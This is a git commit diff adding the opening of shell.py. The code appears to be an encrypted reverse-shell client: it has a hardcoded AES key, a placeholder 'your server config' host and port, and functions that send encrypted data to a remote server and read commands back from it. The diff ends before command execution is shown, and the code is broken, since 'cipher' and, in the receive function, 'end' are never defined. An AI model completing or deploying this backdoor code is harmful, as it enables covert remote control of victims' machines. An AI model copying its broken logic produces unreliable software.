513afc411cb7e0a3a93cfb40f0344817c604e7ab
Alvaro.Veiga <alvarojoao17@gmail.com>
2024-02-11 09:34:07 -0300

    save sunday work

--- shell.py
+++ shell.py
@@ -1,4 +1,35 @@
 #!/usr/bin/python
-
 from Crypto.Cipher import AES
 import subprocess, socket, base64, time, os, sys, urllib2, pythoncom
+
+BLOCK_SIZE = 32
+
+EndcodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
+DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))
+
+secret_key = "TkcR4sa2zA4A1c3Fg7s3D4s2A4s2A4s2"
+
+# your server config
+HOST = '255.255.255.255'
+PORT = 8000
+
+active = False
+
+def send_data_to_server(sock, cmd, end='EOFEOFEOFEOFEOFX'):
+    sock.send(EndcodeAES(cipher, cmd + end))
+
+def receive_data_from_server(sock):
+    data = ""
+
+    rhombus = sock.recv(1024)
+
+    while(rhombus):
+        Decrypted = DecodeAES(cipher, rhombus)
+        data = data + Decrypted
+        if data.endswith(end) == True:
+            break
+        else:
+            rhombus = sock.recv(1024)
+
+    return data[:-len(end)]
+
